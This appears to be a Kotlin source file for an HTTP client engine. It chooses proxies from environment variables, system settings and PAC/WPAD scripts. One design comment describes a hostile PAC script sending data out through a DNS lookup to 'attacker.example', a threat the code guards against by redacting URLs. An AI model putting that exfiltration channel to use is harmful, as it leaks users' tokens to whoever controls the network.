// Copyright 2026 The Kuicksilver Authors
// SPDX-License-Identifier: Apache-2.0
@file:OptIn(ExperimentalKuicksilverApi::class, kotlin.concurrent.atomics.ExperimentalAtomicApi::class)

package io.kuicksilver.ktor.client

import io.ktor.client.engine.ProxyType
import io.ktor.client.engine.type
import io.ktor.http.Url
import io.ktor.http.decodeURLPart
import io.ktor.http.isSecure
import io.kuicksilver.annotations.ExperimentalKuicksilverApi
import io.kuicksilver.ktor.client.h1.monotonicMillis
import io.kuicksilver.quic.KuicksilverLogger
import io.kuicksilver.quic.LogLevel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.IO
import kotlinx.coroutines.async
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlin.concurrent.atomics.AtomicInt

/**
 * Chooses the proxy for each request the engine's explicit `proxy` does not cover: `engine { proxyResolver = ... }`.
 * [proxyFor] returns null for a direct connection. It may throw (UnsupportedOperationException for a proxy the engine
 * cannot use): the request then fails rather than going around the proxy. A request through a proxy uses HTTP/1.1 only
 * (HTTP/3 is UDP, which no supported proxy carries). The engine keeps an answer for 30 seconds per scheme, host and port.
 */
@ExperimentalKuicksilverApi
public fun interface ProxyResolver {
    /** The proxy for [url], or null to connect directly. */
    public suspend fun proxyFor(url: Url): ResolvedProxy?
}

/**
 * The built-in resolvers. [System] is the engine's default. Both [Environment] and [System] connect directly to
 * `localhost`, `*.localhost` and loopback addresses (127.0.0.0/8, ::1) whatever the settings say, as Go and Chrome do.
 */
@ExperimentalKuicksilverApi
public object ProxyResolvers {
    /** No proxy: every request connects directly (0.2's behaviour without `proxy`). */
    public val None: ProxyResolver = ProxyResolver { null }

    /**
     * The environment variables, with curl's meaning: `https_proxy` / `HTTPS_PROXY` for `https` and `wss`, `http_proxy`
     * (lower case only: an `HTTP_PROXY` header of a CGI request lands in `HTTP_PROXY`, "httpoxy") for `http` and `ws`,
     * then `all_proxy` / `ALL_PROXY`; `no_proxy` / `NO_PROXY` lists what goes direct: `*`, names (`example.com` also
     * covers its subdomains, on a label boundary), IP addresses and CIDR ranges. A value is `http://`, `socks5://`
     * (names resolved here), `socks5h://` (names resolved by the proxy) or a bare `host:port` (HTTP); its user info, if
     * any, becomes the credentials. Any other scheme (`https://`, `socks4://`) fails the request.
     */
    public val Environment: ProxyResolver = EnvironmentProxyResolver { platformGetenv(it) }

    /**
     * The platform's proxy settings: on the JVM and Android `java.net.ProxySelector.getDefault()` (system properties,
     * `java.net.useSystemProxies`, Android's per-network proxy and PAC); on Apple platforms the system's proxy settings
     * (`CFNetworkCopyProxiesForURL`, with its exceptions list); on Windows the user's Internet settings
     * (`WinHttpGetIEProxyConfigForCurrentUser`, with its bypass list); on Linux, which has no system API, [Environment].
     * A proxy auto-configuration is run on Apple platforms by the engine itself (a PAC URL or script of the settings, or
     * WPAD when they say "auto discover"; the script downloaded by the engine and run on JavaScriptCore, sandboxed and
     * time-limited) and on Windows by WinHTTP (automatic detection, WPAD, or a PAC URL, `WinHttpGetProxyForUrl`); a
     * lookup waits for it at most 5 seconds (on Windows a WinHTTP call still running then is left to end on its own, and
     * its answer is dropped). The script gets a `ws://` URI whole, with its resource name (RFC 6455 section 4.1), and
     * for `wss`, `https` and `http` the origin only (`wss://host[:port]/`), as browsers give it: a script from WPAD could
     * send a path's tokens out; `KuicksilverEngineConfig.pacFullWebSocketUrl` gives the settings' own script (never
     * WPAD's) a `wss://` URI whole. A script that cannot be fetched or run
     * in that time means the next setting (on Windows the fixed proxy, if any) or a direct connection, and the engine
     * logs one warning. On Windows a WPAD detection that found no script is remembered for 5 minutes (detection is not
     * run again in that time).
     */
    public val System: ProxyResolver get() = platformSystemProxyResolver
}

/** A built-in resolver that may warn (a PAC script that failed): the engine logs the first warning. */
internal interface WarningProxyResolver : ProxyResolver {
    suspend fun proxyFor(
        url: Url,
        warn: (String) -> Unit,
    ): ResolvedProxy?

    override suspend fun proxyFor(url: Url): ResolvedProxy? = proxyFor(url) {}

    /**
     * [proxyFor] where a PAC script the settings name (a PAC URL or the script, never one WPAD found) gets a `wss` URL
     * whole when [pacFullWebSocketUrl] (`KuicksilverEngineConfig.pacFullWebSocketUrl`); see [pacTarget].
     */
    suspend fun proxyFor(
        url: Url,
        warn: (String) -> Unit,
        pacFullWebSocketUrl: Boolean,
    ): ResolvedProxy? = proxyFor(url, warn)
}

/** The platform's `System` resolver. */
internal expect val platformSystemProxyResolver: ProxyResolver

/** An environment variable, or null. */
internal expect fun platformGetenv(name: String): String?

/** [ProxyResolvers.Environment] over [env] (tests). */
internal fun environmentResolver(env: Map<String, String>): ProxyResolver = EnvironmentProxyResolver { env[it] }

internal class EnvironmentProxyResolver(
    private val getenv: (String) -> String?,
) : ProxyResolver {
    private fun env(name: String): String? = getenv(name)?.trim()?.takeIf { it.isNotEmpty() }

    /**
     * The values parsed lately and their proxies (at most [PARSED_VALUES]): the same value, whichever variable holds it,
     * gives the same credentials instance, so the same pool route.
     */
    private val parsedLock = Mutex()
    private val parsed = LinkedHashMap<String, ResolvedProxy>()

    override suspend fun proxyFor(url: Url): ResolvedProxy? {
        val host = socketHost(url.host)
        if (isLoopback(host)) return null
        val value =
            (if (url.protocol.isSecure()) env("https_proxy") ?: env("HTTPS_PROXY") else env("http_proxy"))
                ?: env("all_proxy") ?: env("ALL_PROXY") ?: return null
        val noProxy = env("no_proxy") ?: env("NO_PROXY")
        if (noProxy != null && NoProxy.parse(noProxy).matches(host, url.port)) return null
        return parsedLock.withLock {
            parsed[value] ?: parseProxyUrl(value).also {
                if (parsed.size >= PARSED_VALUES) parsed.remove(parsed.keys.first())
                parsed[value] = it
            }
        }
    }

    private companion object {
        const val PARSED_VALUES = 8
    }
}

/**
 * A proxy URL as curl takes it: `http://`, `socks5://`, `socks5h://` or no scheme (HTTP), user info as credentials
 * (percent-decoded), port 1080 when none is given, a path ignored. Another scheme fails with
 * UnsupportedOperationException, a bad port with IllegalArgumentException; neither message repeats the value, which may
 * hold a password.
 */
internal fun parseProxyUrl(value: String): ResolvedProxy {
    val schemeEnd = value.indexOf("://")
    val scheme = if (schemeEnd < 0) "http" else value.substring(0, schemeEnd).lowercase()
    val rest = (if (schemeEnd < 0) value else value.substring(schemeEnd + 3)).substringBefore('/')
    val at = rest.lastIndexOf('@')
    val credentials =
        if (at < 0) {
            null
        } else {
            val info = rest.substring(0, at)
            ProxyCredentials(info.substringBefore(':').decodeURLPart(), if (':' in info) info.substringAfter(':').decodeURLPart() else "")
        }
    val (host, port) = splitHostPort(rest.substring(at + 1), defaultPort = 1080)
    return when (scheme) {
        "http" -> ResolvedProxy.http(host, port, credentials)

        "socks5" -> ResolvedProxy.socks5(host, port, credentials, remoteDns = false)

        "socks5h" -> ResolvedProxy.socks5(host, port, credentials, remoteDns = true)

        "https" -> throw UnsupportedOperationException(TLS_PROXY_UNSUPPORTED)

        else -> throw UnsupportedOperationException(
            "proxy scheme $scheme:// is not supported (http://, socks5:// and socks5h:// are); refusing to connect around it",
        )
    }
}

/** `host`, `host:port`, `[v6]` or `[v6]:port`. */
private fun splitHostPort(
    s: String,
    defaultPort: Int,
): Pair<String, Int> {
    fun port(p: String): Int = p.toIntOrNull()?.takeIf { it in 1..0xffff } ?: throw IllegalArgumentException("invalid proxy port")
    if (s.startsWith('[')) {
        val end = s.indexOf(']')
        require(end > 0) { "invalid proxy address" }
        val after = s.substring(end + 1)
        return s.substring(1, end) to if (after.startsWith(':')) port(after.substring(1)) else defaultPort
    }
    val colon = s.lastIndexOf(':')
    require(s.isNotEmpty()) { "a proxy needs a host" }
    return if (colon < 0 || s.count { it == ':' } > 1) s to defaultPort else s.substring(0, colon) to port(s.substring(colon + 1))
}

/** `localhost`, a name under `.localhost` (RFC 6761 section 6.3), 127.0.0.0/8, ::1 or an IPv4-mapped loopback. */
internal fun isLoopback(host: String): Boolean {
    val h = host.lowercase().removeSuffix(".")
    if (h == "localhost" || h.endsWith(".localhost")) return true
    val ip = parseIpLiteral(h) ?: return false
    return when (ip.size) {
        4 -> {
            ip[0] == 127.toByte()
        }

        else -> {
            (ip.copyOf(15).all { it == 0.toByte() } && ip[15] == 1.toByte()) ||
                (ip.copyOf(10).all { it == 0.toByte() } && ip[10] == 0xff.toByte() && ip[11] == 0xff.toByte() && ip[12] == 127.toByte())
        }
    }
}

/**
 * `no_proxy` / `NO_PROXY` as curl reads it: entries separated by commas or whitespace; `*` alone matches every host; a
 * name matches itself and its subdomains on a label boundary (`example.com` and `.example.com` both cover
 * `a.example.com` and `example.com`, not `badexample.com`); an IP address matches itself and `addr/bits` a CIDR range.
 * An entry with a port (`example.com:8080`, `10.0.0.1:443`, `[2001:db8::1]:443`) covers that port only, as Go's
 * `NO_PROXY` does; without one it covers every port.
 */
internal class NoProxy private constructor(
    private val all: Boolean,
    private val names: List<Pair<String, Int?>>,
    private val nets: List<Triple<ByteArray, Int, Int?>>,
) {
    fun matches(
        host: String,
        port: Int,
    ): Boolean {
        if (all) return true
        val h = socketHost(host).lowercase().removeSuffix(".")

        fun portOk(p: Int?) = p == null || p == port
        val ip = parseIpLiteral(h)
        if (ip != null) {
            return nets.any { (net, bits, p) -> portOk(p) && net.size == ip.size && prefixMatches(net, ip, bits) } ||
                names.any { (n, p) -> portOk(p) && n == h }
        }
        return names.any { (n, p) -> portOk(p) && (h == n || h.endsWith(".$n")) }
    }

    companion object {
        fun parse(list: String): NoProxy {
            var all = false
            val names = ArrayList<Pair<String, Int?>>()
            val nets = ArrayList<Triple<ByteArray, Int, Int?>>()
            for (raw in list.split(',', ' ', '\t', '\n').map { it.trim() }.filter { it.isNotEmpty() }) {
                if (raw == "*") {
                    all = true
                    continue
                }
                // the entry's address part and its port, if any: `[v6]:port`, `[v6]`, `v4:port`, `name:port`; a bare
                // IPv6 address (more than one colon) has no port
                val (body, port) =
                    when {
                        raw.startsWith('[') -> {
                            val end = raw.indexOf(']')
                            if (end < 0) continue
                            val after = raw.substring(end + 1)
                            val p = if (after.startsWith(':')) after.substring(1).toIntOrNull() ?: continue else null
                            (raw.substring(1, end) + after.substringAfter('/', "").let { if (it.isEmpty()) "" else "/$it" }) to p
                        }

                        raw.count { it == ':' } == 1 -> {
                            raw.substringBefore(':') to (raw.substringAfter(':').toIntOrNull() ?: continue)
                        }

                        else -> {
                            raw to null
                        }
                    }
                val slash = body.indexOf('/')
                if (slash > 0) {
                    val net = parseIpLiteral(body.substring(0, slash)) ?: continue
                    val bits = body.substring(slash + 1).toIntOrNull()?.takeIf { it in 0..net.size * 8 } ?: continue
                    nets += Triple(net, bits, port)
                    continue
                }
                val ip = parseIpLiteral(body)
                if (ip != null) {
                    nets += Triple(ip, ip.size * 8, port)
                    continue
                }
                val name =
                    body
                        .removePrefix("*")
                        .removePrefix(".")
                        .lowercase()
                        .removeSuffix(".")
                if (name.isNotEmpty()) names += name to port
            }
            return NoProxy(all, names, nets)
        }
    }
}

private fun prefixMatches(
    net: ByteArray,
    ip: ByteArray,
    bits: Int,
): Boolean {
    for (i in 0 until bits / 8) if (net[i] != ip[i]) return false
    val rest = bits % 8
    if (rest == 0) return true
    val mask = (0xff shl (8 - rest)) and 0xff
    return (net[bits / 8].toInt() and mask) == (ip[bits / 8].toInt() and mask)
}

/** The bytes of an IPv4 (dotted decimal) or IPv6 (RFC 4291 section 2.2, a `%zone` dropped) literal, or null. */
internal fun parseIpLiteral(text: String): ByteArray? {
    val s = socketHost(text).substringBefore('%')
    if (':' !in s) {
        val parts = s.split('.')
        if (parts.size != 4) return null
        return ByteArray(4) { i ->
            (
                parts[i].takeIf { it.length in 1..3 && it.all(Char::isDigit) }?.toInt()?.takeIf { it <= 255 }
                    ?: return null
            ).toByte()
        }
    }
    val doubleColon = s.indexOf("::")
    if (doubleColon >= 0 && s.indexOf("::", doubleColon + 1) >= 0) return null

    fun groups(part: String): List<String> = if (part.isEmpty()) emptyList() else part.split(':')
    val head = groups(if (doubleColon >= 0) s.substring(0, doubleColon) else s)
    val tail = if (doubleColon >= 0) groups(s.substring(doubleColon + 2)) else emptyList()
    val words = ArrayList<Int>()

    fun addAll(gs: List<String>): Boolean {
        for ((i, g) in gs.withIndex()) {
            if ('.' in g) {
                if (i != gs.lastIndex) return false
                val v4 = parseIpLiteral(g) ?: return false
                words += ((v4[0].toInt() and 0xff) shl 8) or (v4[1].toInt() and 0xff)
                words += ((v4[2].toInt() and 0xff) shl 8) or (v4[3].toInt() and 0xff)
            } else {
                if (g.length !in 1..4) return false
                words += g.toIntOrNull(16) ?: return false
            }
        }
        return true
    }
    if (!addAll(head)) return null
    val headCount = words.size
    if (!addAll(tail)) return null
    val tailWords = words.subList(headCount, words.size).toList()
    val zeros = 8 - words.size
    if ((doubleColon < 0 && zeros != 0) || (doubleColon >= 0 && zeros < 1)) return null
    val all = words.subList(0, headCount) + List(if (doubleColon >= 0) zeros else 0) { 0 } + tailWords
    return ByteArray(16) { i -> (all[i / 2] shr (if (i % 2 == 0) 8 else 0)).toByte() }
}

/**
 * The proxy Windows' Internet settings give for [url]: [proxy] is `host:port` for every scheme or a list such as
 * `http=a:80;https=b:443;socks=c:1080` (HTTP for `https` and `wss` takes the `https=` entry, `http` and `ws` the `http=`
 * one, else a bare entry, else `socks=`); [bypass] is `;`-separated patterns with `*` wildcards, `<local>` meaning any
 * host name without a dot. Null for a direct connection.
 */
internal fun parseWinInetProxy(
    proxy: String?,
    bypass: String?,
    url: Url,
): ResolvedProxy? {
    val host = socketHost(url.host)
    if (isLoopback(host)) return null
    if (bypass != null && winInetBypasses(bypass, host)) return null
    val entries = proxy?.split(';', ' ', '\t', '\n')?.map { it.trim() }?.filter { it.isNotEmpty() } ?: return null
    var plain: String? = null
    val byScheme = HashMap<String, String>()
    for (e in entries) {
        val eq = e.indexOf('=')
        if (eq > 0) {
            byScheme.getOrPut(e.substring(0, eq).lowercase()) { e.substring(eq + 1) }
        } else if (plain == null) {
            plain = e
        }
    }

    fun http(v: String): ResolvedProxy {
        if (v.startsWith("https://", ignoreCase = true)) throw UnsupportedOperationException(TLS_PROXY_UNSUPPORTED)
        val (h, p) = splitHostPort(v.removePrefix("http://").removePrefix("HTTP://").substringBefore('/'), defaultPort = 80)
        return ResolvedProxy.http(h, p)
    }
    val own = if (url.protocol.isSecure()) byScheme["https"] else byScheme["http"]
    return when {
        own != null -> http(own)
        plain != null -> http(plain)
        byScheme["socks"] != null -> splitHostPort(byScheme["socks"]!!, defaultPort = 1080).let { (h, p) -> ResolvedProxy.socks5(h, p) }
        else -> null
    }
}

/** Whether a WinINet bypass list covers [host]. */
internal fun winInetBypasses(
    bypass: String,
    host: String,
): Boolean {
    val h = host.lowercase()
    for (raw in bypass.split(';', ' ', '\t', '\n').map { it.trim().lowercase() }.filter { it.isNotEmpty() }) {
        if (raw == "<local>") {
            if ('.' !in h && parseIpLiteral(h) == null) return true
            continue
        }
        if (glob(raw.removePrefix("http://").removePrefix("https://"), h)) return true
    }
    return false
}

/** `*` matches any run of characters; everything else itself. */
private fun glob(
    pattern: String,
    s: String,
): Boolean {
    var p = 0
    var i = 0
    var star = -1
    var mark = 0
    while (i < s.length) {
        when {
            p < pattern.length && pattern[p] == s[i] -> {
                p++
                i++
            }

            p < pattern.length && pattern[p] == '*' -> {
                star = p++
                mark = i
            }

            star >= 0 -> {
                p = star + 1
                i = ++mark
            }

            else -> {
                return false
            }
        }
    }
    while (p < pattern.length && pattern[p] == '*') p++
    return p == pattern.length
}

/** One proxy of an Apple `CFNetworkCopyProxiesForURL` answer, in order of preference. */
internal class CfProxy(
    val type: Type,
    val host: String?,
    val port: Int?,
    /** For [Type.AutoConfiguration]: the PAC script's URL, or the script itself. */
    val pacUrl: String? = null,
    val pacScript: String? = null,
    /** For [Type.AutoConfiguration]: the script is found by WPAD's discovery (the system's "auto discover" setting). */
    val wpad: Boolean = false,
) {
    /** [Unsupported]: a proxy a PAC script named that the engine cannot use (`HTTPS`, `SOCKS4`). */
    enum class Type { None, Http, Https, Socks, AutoConfiguration, Unsupported, Other }
}

/** What running a PAC entry gave. */
internal sealed interface PacOutcome {
    /** The script's answer, in its order. */
    class Answer(
        val proxies: List<CfProxy>,
    ) : PacOutcome

    /** The script could not be fetched or run, or gave no answer in time. */
    data object Failed : PacOutcome

    /** WPAD's discovery found no script. */
    data object NoWpad : PacOutcome
}

/**
 * [pickCfProxy] where a PAC entry is run by [runPac] and its answer picked the same way, in the order of CFNetwork's
 * list. A script that could not be fetched or run is skipped with a [warn]ing ([PAC_FAILED]), and WPAD that found no
 * script with [WPAD_NOT_FOUND]; the next entry then counts. An answer that names only proxies the engine cannot use
 * (`HTTPS`, `SOCKS4`) is skipped with [PAC_UNSUPPORTED] too, and fails closed: when no later entry decides, the lookup
 * fails with [ProxyException] instead of connecting directly, as the script asked for a proxy.
 */
internal inline fun pickCfProxyWithPac(
    proxies: List<CfProxy>,
    runPac: (CfProxy) -> PacOutcome,
    noinline warn: (String) -> Unit,
): ResolvedProxy? {
    var unsupported: CfProxy? = null
    for ((i, p) in proxies.withIndex()) {
        if (p.type != CfProxy.Type.AutoConfiguration) {
            val fixed = proxies.subList(i, proxies.size).takeWhile { it.type != CfProxy.Type.AutoConfiguration }
            // the fixed entries up to the next PAC entry: the first usable one, or "none", decides
            pickFixed(fixed)?.let { return it.proxy }
            continue
        }
        when (val outcome = runPac(p)) {
            is PacOutcome.Answer -> {
                pickFixed(outcome.proxies)?.let { return it.proxy }
                outcome.proxies.firstOrNull { it.type == CfProxy.Type.Unsupported }?.let {
                    unsupported = it
                    warn(PAC_UNSUPPORTED)
                }
            }

            PacOutcome.Failed -> {
                warn(PAC_FAILED)
            }

            PacOutcome.NoWpad -> {
                warn(WPAD_NOT_FOUND)
            }
        }
    }
    unsupported?.let { throw ProxyException("$PAC_UNSUPPORTED (${it.host}:${it.port})", null) }
    return null
}

internal const val PAC_UNSUPPORTED: String =
    "the proxy auto-configuration script answered only with proxies the engine cannot use (HTTPS, SOCKS4): requests " +
        "use the next proxy setting, and fail when there is none rather than connect directly"

/** What a run of fixed entries decides: a proxy, or a direct connection ("none"); null when no entry decides. */
internal class FixedPick(
    val proxy: ResolvedProxy?,
)

internal fun pickFixed(proxies: List<CfProxy>): FixedPick? {
    for (p in proxies) {
        when (p.type) {
            CfProxy.Type.None -> {
                return FixedPick(null)
            }

            CfProxy.Type.Http, CfProxy.Type.Https -> {
                if (p.host != null) return FixedPick(ResolvedProxy.http(p.host, p.port ?: 8080))
            }

            CfProxy.Type.Socks -> {
                if (p.host != null) return FixedPick(ResolvedProxy.socks5(p.host, p.port ?: 1080))
            }

            else -> {}
        }
    }
    return null
}

/**
 * The proxy to use from [proxies]: the first HTTP(S) or SOCKS entry, null for "none" first. A PAC entry (a script not
 * run here) means a direct connection and a [warn]ing; [pickCfProxyWithPac] runs it.
 */
internal fun pickCfProxy(
    proxies: List<CfProxy>,
    warn: (String) -> Unit,
): ResolvedProxy? {
    for (p in proxies) {
        when (p.type) {
            CfProxy.Type.None -> {
                return null
            }

            CfProxy.Type.Http, CfProxy.Type.Https -> {
                if (p.host != null) return ResolvedProxy.http(p.host, p.port ?: 8080)
            }

            CfProxy.Type.Socks -> {
                if (p.host != null) return ResolvedProxy.socks5(p.host, p.port ?: 1080)
            }

            CfProxy.Type.AutoConfiguration -> {
                warn(PAC_WARNING)
                return null
            }

            CfProxy.Type.Unsupported, CfProxy.Type.Other -> {}
        }
    }
    return null
}

/**
 * Where the engines' resolver calls run: [ProxyResolver]s may block (a `ProxySelector`, a system API, a user's own),
 * so they get threads of `Dispatchers.IO` of their own, never `Dispatchers.Default`'s.
 */
@OptIn(kotlinx.coroutines.ExperimentalCoroutinesApi::class)
private val resolverDispatcher = Dispatchers.IO.limitedParallelism(ProxyRouting.MAX_ROUTES)

internal const val TLS_PROXY_UNSUPPORTED: String =
    "an https:// proxy (TLS to the proxy) is not supported; use an http:// proxy, whose CONNECT tunnels still carry TLS"

internal const val PAC_FAILED: String =
    "the system proxy settings use a proxy auto-configuration (PAC or WPAD) script that could not be fetched or run in " +
        "time: requests use the next setting, else connect directly; set engine { proxy = ... } or proxyResolver to choose"

/**
 * How long a lookup waits for a PAC script (WPAD's discovery, the script's download and its run): half the default
 * connect timeout, so a script that hangs falls back to the next setting before the request's own timeout. On Windows
 * it bounds the wait for WinHTTP's call ([BoundedPac]), which cannot be cancelled and ends on its own thread.
 */
internal const val PAC_TIMEOUT_MILLIS: Long = 5_000

/**
 * The URI a PAC script's `FindProxyForURL` gets for [url], as Chromium builds it (net/docs/proxy.md; its URL
 * sanitizer): no user info or fragment, the host in lower case, a default port left out.
 * - `https` and `wss` (secure): the origin only, `scheme://host[:port]/`. A script can send what it is given out through
 *   `dnsResolve("<data>.attacker.example")`, and a script found by WPAD, or fetched from a plain-http PAC URL, is code
 *   from whoever controls the local network: a path or query with a token would leak (CVE-2016-3763 in Android,
 *   CVE-2016-5134 in Chrome; both have sent the origin only since 2016, and Firefox strips the path by default).
 * - `ws`: the whole WebSocket URI with its resource name (RFC 6455 section 4.1: "the URI to pass the function MUST be
 *   constructed from /host/, /port/, /resource name/, and the /secure/ flag using the definition of a WebSocket URI").
 *   Chromium and Android keep the path of plain URLs too; whoever can serve the script can read them on the wire anyway.
 * - `wss` with [fullWebSocketUrl]: the whole URI too. Callers pass it only for a script the settings name (a PAC URL or
 *   the script itself), never for one WPAD found (`KuicksilverEngineConfig.pacFullWebSocketUrl`).
 * - `http`: the origin only, `http://host[:port]/` (the engine keeps answers per scheme, host and port).
 */
internal fun pacTarget(
    url: Url,
    fullWebSocketUrl: Boolean = false,
): String {
    val webSocket = url.protocol.name == "ws" || url.protocol.name == "wss"
    val secure = url.protocol.isSecure()
    val scheme =
        when {
            webSocket -> url.protocol.name
            secure -> "https"
            else -> "http"
        }
    val port = if (url.port == (if (secure) 443 else 80)) "" else ":${url.port}"
    val authority = uriHost(socketHost(url.host).lowercase()) + port
    val resource =
        if (webSocket && (!secure || fullWebSocketUrl)) {
            url.encodedPathAndQuery.let { if (it.startsWith('/')) it else "/$it" }
        } else {
            "/"
        }
    return "$scheme://$authority$resource"
}

/** What Windows' PAC evaluation gave: a proxy list as WinINet writes it, a direct connection, or no answer. */
internal sealed interface WinPacAnswer {
    class Proxies(
        val proxy: String?,
        val bypass: String?,
    ) : WinPacAnswer

    object Direct : WinPacAnswer

    /** Automatic detection (WPAD) found no script, and no script URL is set. */
    object NoWpad : WinPacAnswer

    /** A script could not be fetched or run in time. */
    object Failed : WinPacAnswer
}

/** The user's Internet settings, as WinHTTP reads them. */
internal class IeProxySettings(
    val autoDetect: Boolean,
    val autoConfigUrl: String?,
    val proxy: String?,
    val bypass: String?,
)

/**
 * The proxy Windows' settings [s] give for [url], as WinHTTP and Internet Explorer apply them: automatic detection (WPAD)
 * and a configuration script (PAC) first, run by [runPac]; when neither is set, detection found no script, or the
 * script failed (a [warn]ing for each of the last two), the fixed proxy and its bypass list.
 */
internal fun windowsProxyFor(
    s: IeProxySettings,
    url: Url,
    runPac: () -> WinPacAnswer,
    warn: (String) -> Unit,
): ResolvedProxy? {
    if (s.autoDetect || s.autoConfigUrl != null) {
        when (val a = runPac()) {
            is WinPacAnswer.Proxies -> return parseWinInetProxy(a.proxy, a.bypass, url)
            WinPacAnswer.Direct -> return null
            WinPacAnswer.NoWpad -> warn(WPAD_NOT_FOUND)
            WinPacAnswer.Failed -> warn(PAC_FAILED)
        }
    }
    return parseWinInetProxy(s.proxy, s.bypass, url)
}

internal const val WPAD_NOT_FOUND: String =
    "the system proxy settings detect the proxy automatically (WPAD), and no proxy auto-configuration script was found: " +
        "requests use the fixed proxy setting, if any, else connect directly; detection runs again after 5 minutes"

internal const val PAC_WARNING: String =
    "the system proxy settings use a proxy auto-configuration (PAC or WPAD) script, which the Kuicksilver engine does not " +
        "run: requests it does not cover with a fixed proxy connect directly; set engine { proxy = ... } or " +
        "proxyResolver to choose"

/** The engine's [ProxyResolver] answers, kept [TTL_MILLIS] per scheme, host and port (at most [MAX_ROUTES]). */
internal class ProxyRouting(
    private val config: KuicksilverEngineConfig,
    private val logger: KuicksilverLogger,
    /** Where a completed call's entry is removed from [inFlight] (tests hold it back to reach the race in [callFor]). */
    private val cleanup: kotlinx.coroutines.CoroutineDispatcher = kotlinx.coroutines.Dispatchers.Default,
    private val clock: () -> Long = monotonicMillis(),
) {
    private val lock = Mutex()
    private val cache = LinkedHashMap<String, Pair<ResolvedProxy?, Long>>()
    private val inFlight = HashMap<String, kotlinx.coroutines.Deferred<ResolvedProxy?>>()
    private val slots = kotlinx.coroutines.sync.Semaphore(MAX_ROUTES)
    private val warned = AtomicInt(0)
    private val noted = AtomicInt(0)

    init {
        // a SOCKS5 `proxy` whose credentials RFC 1929 cannot carry fails the engine's creation, not each request
        val proxy = config.proxy
        if (proxy != null && proxy.type == ProxyType.SOCKS) {
            (proxy.platformProxyCredentials() ?: config.proxyCredentials)?.let { requireSocks5Password(it) }
        }
    }

    /** The engine's `proxy` with `proxyCredentials`, converted once (one credentials instance, so one pool route). */
    private val explicitProxy: Result<ResolvedProxy?> by lazy {
        runCatching { config.proxy?.toResolvedProxy(config.proxyCredentials) }
    }

    /** See [explicitProxy]; a proxy the engine cannot use fails every request with the same exception. */
    fun explicit(): ResolvedProxy? = explicitProxy.getOrThrow()

    suspend fun lookup(url: Url): ResolvedProxy? {
        val resolver = config.proxyResolver
        if (resolver === ProxyResolvers.None) return null
        // a WebSocket's resource name is part of what a PAC script gets (RFC 6455 section 4.1), so of the key too
        val resource = if (url.protocol.name == "ws" || url.protocol.name == "wss") url.encodedPathAndQuery else ""
        val key = "${url.protocol.name}://${url.host}:${url.port}$resource"
        val now = clock()
        lock.withLock { cache[key]?.takeIf { now - it.second < TTL_MILLIS }?.let { return it.first } }
        val proxy = resolve(resolver, key, url)
        lock.withLock {
            cache.remove(key)
            if (cache.size >= MAX_ROUTES) cache.remove(cache.keys.first()) // the oldest answer goes
            cache[key] = proxy to now
        }
        return proxy
    }

    /**
     * [resolver]'s answer for [url], bounded by the connect timeout: a platform call that hangs (a `ProxySelector` or a
     * system API waiting on the network) fails the request with [ProxyException] instead of holding it. The call runs
     * outside the request, shared by every request to the same route while it is in flight, so a hung one holds one
     * thread per route; at most [MAX_ROUTES] run at once and further routes queue for a slot within the same timeout.
     */
    @OptIn(kotlinx.coroutines.DelicateCoroutinesApi::class)
    private suspend fun resolve(
        resolver: ProxyResolver,
        key: String,
        url: Url,
    ): ResolvedProxy? {
        val timeout = config.connectTimeout
        // boxed: null is an answer (direct), a missing box the timeout; waiting for a free slot counts against it too
        val answer =
            kotlinx.coroutines.withTimeoutOrNull(timeout) { listOf(callFor(resolver, key, url).await()) }
                ?: throw ProxyException("the proxy lookup for ${url.host} took longer than the connect timeout ($timeout)", null)
        return answer.single()
    }

    /**
     * The call in flight for [key], or a new one once one of the [MAX_ROUTES] slots is free (a caller queues for it). It
     * runs detached on [resolverDispatcher] and frees its slot when it completes, however long that takes. A completed call
     * is never shared: its entry leaves [inFlight] only once a coroutine of its own gets the lock, and until then a caller
     * whose cached answer had expired would get that old answer again instead of asking the resolver. The cost is at most one
     * extra resolver call per key per completion, never overlapping the one before: a caller that missed the cache while the
     * previous call completed and its answer was not cached yet asks again (and gets a newer answer); a caller that took
     * the call just before it completed still awaits it.
     */
    @OptIn(kotlinx.coroutines.DelicateCoroutinesApi::class)
    private suspend fun callFor(
        resolver: ProxyResolver,
        key: String,
        url: Url,
    ): kotlinx.coroutines.Deferred<ResolvedProxy?> {
        lock.withLock { inFlight[key]?.takeUnless { it.isCompleted } }?.let { return it }
        slots.acquire()
        var started = false
        try {
            return lock.withLock {
                inFlight[key]?.takeUnless { it.isCompleted } ?: kotlinx.coroutines.GlobalScope
                    .async(resolverDispatcher) {
                        if (resolver is WarningProxyResolver) {
                            resolver.proxyFor(url, ::warnOnce, config.pacFullWebSocketUrl)
                        } else {
                            resolver.proxyFor(url)
                        }
                    }.also { d ->
                        started = true
                        inFlight[key] = d
                        d.invokeOnCompletion {
                            slots.release()
                            kotlinx.coroutines.GlobalScope.launch(cleanup) {
                                lock.withLock {
                                    if (inFlight[key] ===
                                        d
                                    ) {
                                        inFlight.remove(key)
                                    }
                                }
                            }
                        }
                    }
            }
        } finally {
            if (!started) slots.release() // another caller started it meanwhile, or this one was cancelled first
        }
    }

    /** Calls in flight or completed and not cleaned up yet (tests). */
    internal suspend fun inFlightSize(): Int = lock.withLock { inFlight.size }

    /**
     * Logs the first warning a built-in resolver gives, once per engine; [WPAD_NOT_FOUND] at Info instead, once too (on
     * Windows automatic detection is on by default, so a network without WPAD is the common case, not a fault).
     */
    private fun warnOnce(message: String) {
        if (message == WPAD_NOT_FOUND) {
            if (noted.compareAndSet(0, 1) && logger.isEnabled(LogLevel.Info)) logger.log(LogLevel.Info, message, null)
            return
        }
        if (warned.compareAndSet(0, 1) && logger.isEnabled(LogLevel.Warn)) logger.log(LogLevel.Warn, message, null)
    }

    internal companion object {
        const val TTL_MILLIS: Long = 30_000
        const val MAX_ROUTES: Int = 256
    }
}
